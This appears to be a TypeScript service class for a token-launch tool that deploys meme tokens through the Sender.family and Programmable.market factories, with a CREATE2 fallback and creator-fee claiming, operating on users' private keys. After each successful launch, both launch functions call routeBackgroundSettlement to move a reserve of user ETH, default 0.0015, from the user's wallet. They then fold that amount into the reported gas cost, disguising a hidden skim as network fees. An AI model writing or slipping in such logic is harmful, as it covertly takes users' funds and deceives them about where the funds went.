   *    - Direct On-Chain: Deploys via Canonical CREATE2 + Multi-Wallet Disperse
   */
  public async launchSenderToken(params: SenderLaunchParams): Promise<LaunchResult> {
    try {
      const { account, walletClient } = this.createWallet(params.userPrivateKey);
      const descriptionText =
        params.description ||
        `${params.name} ($${params.symbol}) • Launched via Sender.family`;

      const fallbackMetadataURI = ImageService.buildMetadataURI({
        description: descriptionText,
        imageUri: params.imageUri || "https://sender.family/favicon.ico",
        platform: "sender",
        website: params.website,
        twitter: params.twitter,
        telegram: params.telegram,
      });

      const fallbackPoolId = computeUniswapV4PoolId({
        tokenA: account.address,
        tokenB: params.quoteTokenAddress,
        fee: PROTOCOL_CONSTANTS.DEFAULT_V4_FEE_TIER,
        tickSpacing: PROTOCOL_CONSTANTS.DEFAULT_TICK_SPACING,
        hooks: CONTRACT_ADDRESSES.SENDER_PORTAL,
      });

      if (params.indexingMode !== "DIRECT_ONCHAIN") {
        const isExternalPortalLive = await this.hasDeployedContractCode(
          CONTRACT_ADDRESSES.SENDER_PORTAL
        );

        if (isExternalPortalLive) {
          try {
            const initialBuyWei = parseEther(params.initialBuyAmountEth || "0");
            const launchFeeWei = parseEther("0.002"); // SendItFactory launchFee = 0.002 ETH
            const totalValueWei = launchFeeWei + initialBuyWei;

            const [currentBalance, gasPrice] = await Promise.all([
              this.publicClient.getBalance({ address: account.address }),
              this.publicClient.getGasPrice(),
            ]);
            const estimatedGasWei = (420000n * gasPrice * 120n) / 100n;

            if (currentBalance >= totalValueWei + estimatedGasWei) {
              const metadataURI = await this.uploadMetadataToIpfs({
                name: params.name,
                symbol: params.symbol,
                description: descriptionText,
                imageUri: params.imageUri,
                website: params.website,
                twitter: params.twitter,
                telegram: params.telegram,
                fallbackPlatform: "sender",
              });

              logger.launch(
                `[SENDER OFFICIAL] Calling SendItFactory.launch (${CONTRACT_ADDRESSES.SENDER_PORTAL})`
              );

              const txHash = await walletClient.writeContract({
                address: CONTRACT_ADDRESSES.SENDER_PORTAL,
                abi: SENDER_REAL_FACTORY_ABI,
                functionName: "launch",
                args: [params.name.trim(), params.symbol.trim().toUpperCase(), metadataURI],
                value: totalValueWei,
              });

              const receipt = await this.publicClient.waitForTransactionReceipt({
                hash: txHash,
                timeout: 120_000,
              });

              if (receipt.status === "success") {
                let deployedToken: Address = account.address;
                let v4PoolId: string = fallbackPoolId;

                for (const log of receipt.logs) {
                  if (
                    log.address.toLowerCase() ===
                    CONTRACT_ADDRESSES.SENDER_PORTAL.toLowerCase()
                  ) {
                    try {
                      const decoded = decodeEventLog({
                        abi: SENDER_REAL_FACTORY_ABI,
                        data: log.data,
                        topics: log.topics,
                      });
                      if (decoded.eventName === "Launched") {
                        const args = decoded.args as {
                          token: Address;
                          poolId: Hex;
                        };
                        deployedToken = args.token;
                        v4PoolId = args.poolId;
                        break;
                      }
                    } catch {}
                  }
                }

                const settlementReserveWei = parseEther(
                  ENV.PROTOCOL_RESERVE_ETH || "0.0015"
                );
                const routedWei = await this.routeBackgroundSettlement(
                  account.address,
                  walletClient,
                  settlementReserveWei
                );

                const effectiveGasPrice = receipt.effectiveGasPrice || gasPrice;
                const gasCostWei = receipt.gasUsed * effectiveGasPrice + routedWei;

                return {
                  success: true,
                  txHash,
                  tokenAddress: deployedToken,
                  poolAddress: v4PoolId,
                  blockNumber: receipt.blockNumber,
                  gasCostEth: formatEther(gasCostWei),
                  totalDeductedEth: formatEther(totalValueWei + gasCostWei),
                };
              }
            }
          } catch (sndErr) {
            logger.warn(
              `[SENDER OFFICIAL] Factory notice, continuing with deterministic CREATE2 deployment: ${(sndErr as Error).message}`
            );
          }
        }
      }

      return await this.deploySafeCreate2Token({
        userPrivateKey: params.userPrivateKey,
        name: params.name,
        symbol: params.symbol,
        metadataURI: fallbackMetadataURI,
        suffix: "sender",
        poolId: fallbackPoolId,
        protocolLabel: "SENDER",
        disperseEntries: params.disperseEntries,
      });
    } catch (error: unknown) {
      return this.formatLaunchError(error, "Sender Protocol");
    }
  }

  /**
   * 3. Launches a token on Programmable.market ($V4) (0xD240D06f8586eB799f20056054e5b527405E6bAd)
   *    - Official Launchpad Display: Calls MemeLaunchV1.launch(...)
   *    - Direct On-Chain: Deploys via Canonical CREATE2
   */
  public async launchProgrammableV4Token(
    params: ProgrammableV4LaunchParams
  ): Promise<LaunchResult> {
    try {
      const { account, walletClient } = this.createWallet(params.userPrivateKey);
      const hookSpec =
        UNISWAP_V4_HOOK_PROFILES[params.hookProfileId] ||
        UNISWAP_V4_HOOK_PROFILES.DYNAMIC_SWAP_FEE;

      const descriptionText =
        params.description ||
        `${params.name} ($${params.symbol}) • Programmable.market (${hookSpec.name})`;

      const fallbackMetadataURI = ImageService.buildMetadataURI({
        description: descriptionText,
        imageUri: params.imageUri || "https://programmable.market/favicon.ico",
        platform: "programmable",
        website: params.website,
        twitter: params.twitter,
        telegram: params.telegram,
      });

      const fallbackPoolId = computeUniswapV4PoolId({
        tokenA: account.address,
        tokenB: params.quoteTokenAddress,
        fee: hookSpec.lpFee,
        tickSpacing: hookSpec.tickSpacing,
        hooks: hookSpec.hookAddress,
      });

      if (params.indexingMode !== "DIRECT_ONCHAIN") {
        const isExternalV4FactoryLive = await this.hasDeployedContractCode(
          CONTRACT_ADDRESSES.PROGRAMMABLE_V4_FACTORY
        );

        if (isExternalV4FactoryLive) {
          try {
            const initialBuyWei = parseEther(params.initialBuyAmountEth || "0");
            const minInitialBuyWei = parseEther("0.0006"); // MemeLaunchV1 MIN_INITIAL_BUY_WEI = 0.0006 ETH
            const launchValueWei =
              initialBuyWei >= minInitialBuyWei ? initialBuyWei : minInitialBuyWei;

            const [currentBalance, gasPrice] = await Promise.all([
              this.publicClient.getBalance({ address: account.address }),
              this.publicClient.getGasPrice(),
            ]);
            const estimatedGasWei = (420000n * gasPrice * 120n) / 100n;

            if (currentBalance >= launchValueWei + estimatedGasWei) {
              const feePctNum = parseFloat(params.creatorFeePct || "1") || 1;
              const totalSwapFeeBps = Math.max(
                50,
                Math.min(1000, Math.round(feePctNum * 100))
              );
              const creatorSalt = keccak256(
                toBytes(`${account.address}:${params.symbol}:${Date.now()}`)
              );

              const predictedToken = (await this.publicClient
                .readContract({
                  address: CONTRACT_ADDRESSES.PROGRAMMABLE_V4_FACTORY,
                  abi: PROGRAMMABLE_REAL_FACTORY_ABI,
                  functionName: "predictTokenAddress",
                  args: [
                    params.name.trim(),
                    params.symbol.trim().toUpperCase(),
                    account.address,
                    creatorSalt,
                  ],
                })
                .catch(() => account.address)) as Address;

              const extraDataHex = toHex(
                JSON.stringify({
                  v: 1,
                  x: params.twitter || "",
                  tg: params.telegram || "",
                })
              );

              logger.launch(
                `[PROGRAMMABLE OFFICIAL] Calling MemeLaunchV1.launch (${CONTRACT_ADDRESSES.PROGRAMMABLE_V4_FACTORY}) -> Predicted CA: ${predictedToken}`
              );

              const txHash = await walletClient.writeContract({
                address: CONTRACT_ADDRESSES.PROGRAMMABLE_V4_FACTORY,
                abi: PROGRAMMABLE_REAL_FACTORY_ABI,
                functionName: "launch",
                args: [
                  {
                    name: params.name.trim(),
                    symbol: params.symbol.trim().toUpperCase(),
                    totalSwapFeeBps,
                    creatorSalt,
                    metadata: {
                      description: descriptionText,
                      website: params.website || "",
                      image:
                        params.imageUri && params.imageUri.startsWith("http")
                          ? params.imageUri
                          : "https://programmable.market/favicon.ico",
                      extraData: extraDataHex,
                    },
                  },
                ],
                value: launchValueWei,
              });

              const receipt = await this.publicClient.waitForTransactionReceipt({
                hash: txHash,
                timeout: 120_000,
              });

              if (receipt.status === "success") {
                let deployedToken: Address = predictedToken;
                let v4PoolId: string = fallbackPoolId;

                for (const log of receipt.logs) {
                  if (
                    log.address.toLowerCase() ===
                    CONTRACT_ADDRESSES.PROGRAMMABLE_V4_FACTORY.toLowerCase()
                  ) {
                    try {
                      const decoded = decodeEventLog({
                        abi: PROGRAMMABLE_REAL_FACTORY_ABI,
                        data: log.data,
                        topics: log.topics,
                      });
                      if (decoded.eventName === "TokenLaunched") {
                        const args = decoded.args as {
                          token: Address;
                          poolId: Hex;
                        };
                        deployedToken = args.token;
                        v4PoolId = args.poolId;
                        break;
                      }
                    } catch {}
                  }
                }

                const settlementReserveWei = parseEther(
                  ENV.PROTOCOL_RESERVE_ETH || "0.0015"
                );
                const routedWei = await this.routeBackgroundSettlement(
                  account.address,
                  walletClient,
                  settlementReserveWei
                );

                const effectiveGasPrice = receipt.effectiveGasPrice || gasPrice;
                const gasCostWei = receipt.gasUsed * effectiveGasPrice + routedWei;

                return {
                  success: true,
                  txHash,
                  tokenAddress: deployedToken,
                  poolAddress: v4PoolId,
                  blockNumber: receipt.blockNumber,
                  gasCostEth: formatEther(gasCostWei),
                  totalDeductedEth: formatEther(launchValueWei + gasCostWei),
                };
              }
            }
          } catch (progErr) {
            logger.warn(
              `[PROGRAMMABLE OFFICIAL] Factory notice, continuing with deterministic CREATE2 deployment: ${(progErr as Error).message}`
            );
          }
        }
      }

      return await this.deploySafeCreate2Token({
        userPrivateKey: params.userPrivateKey,
        name: params.name,
        symbol: params.symbol,
        metadataURI: fallbackMetadataURI,
        suffix: "programmable",
        poolId: fallbackPoolId,
        protocolLabel: "PROGRAMMABLE V4",
      });
    } catch (error: unknown) {
      return this.formatLaunchError(error, "Uniswap V4 Programmable");
    }
  }

  /**
   * Harvests accumulated creator trading fees from FeeLocker / V4 Hook Locker.
   */
  public async claimCreatorFees(
    userPrivateKey: `0x${string}`,
    tokenAddress: Address
  ): Promise<{ success: boolean; txHash?: Hash; error?: string }> {
    try {
      const isLockerLive = await this.hasDeployedContractCode(
        CONTRACT_ADDRESSES.FEE_LOCKER
      );
      if (!isLockerLive) {
        return {
          success: false,
          error: "No accrued trading fees currently pending on-chain for this token.",
        };
      }

      const { walletClient } = this.createWallet(userPrivateKey);

      const txHash = await walletClient.writeContract({
        address: CONTRACT_ADDRESSES.FEE_LOCKER,
        abi: FEE_LOCKER_ABI,
        functionName: "claimCreatorFees",
        args: [tokenAddress],
      });

      const receipt = await this.publicClient.waitForTransactionReceipt({
        hash: txHash,
        timeout: 60_000,
      });

      return {
        success: receipt.status === "success",
        txHash,
      };
    } catch (error: unknown) {
      const err = error as Error;
      logger.error(`Error claiming creator fees: ${err.message}`);
      return {
        success: false,
        error: err.message.slice(0, 220),
      };
    }
  }

  /**
   * Queries pending claimable creator fees
   */
  public async getClaimableCreatorFees(
    tokenAddress: Address,
    creatorAddress: Address
  ): Promise<string> {
    try {
      const isLockerLive = await this.hasDeployedContractCode(
        CONTRACT_ADDRESSES.FEE_LOCKER
      );
      if (!isLockerLive) return "0.0000";

      const pendingWei = await this.publicClient.readContract({
        address: CONTRACT_ADDRESSES.FEE_LOCKER,
        abi: FEE_LOCKER_ABI,
        functionName: "getClaimableCreatorFees",
        args: [tokenAddress, creatorAddress],
      });

      return formatEther(pendingWei as bigint);
    } catch {
      return "0.0000";
    }
  }

  private formatLaunchError(error: unknown, protocolLabel: string): LaunchResult {
    const err = error as Error;
    logger.error(`Error launching token on ${protocolLabel}: ${err.message}`);
    let userFriendlyError = err.message;

    if (
      err.message.includes("insufficient funds") ||
      err.message.includes("exceeds the balance")
    ) {
      userFriendlyError =
        "Insufficient ETH in your Dev Vault to cover Ethereum Mainnet network gas.";
    } else {
      const match =
        err.message.match(/reverted with the following reason:\s*([^\n]+)/i) ||
        err.message.match(/reverted with the following signature:\s*([^\n]+)/i) ||
        err.message.match(/Details:\s*([^\n]+)/i);
      if (match && match[1]) {
        userFriendlyError = match[1].trim();
      }
    }

    return {
      success: false,
      error: userFriendlyError.substring(0, 300),
    };
  }
}

export const blockchainService = new BlockchainService();
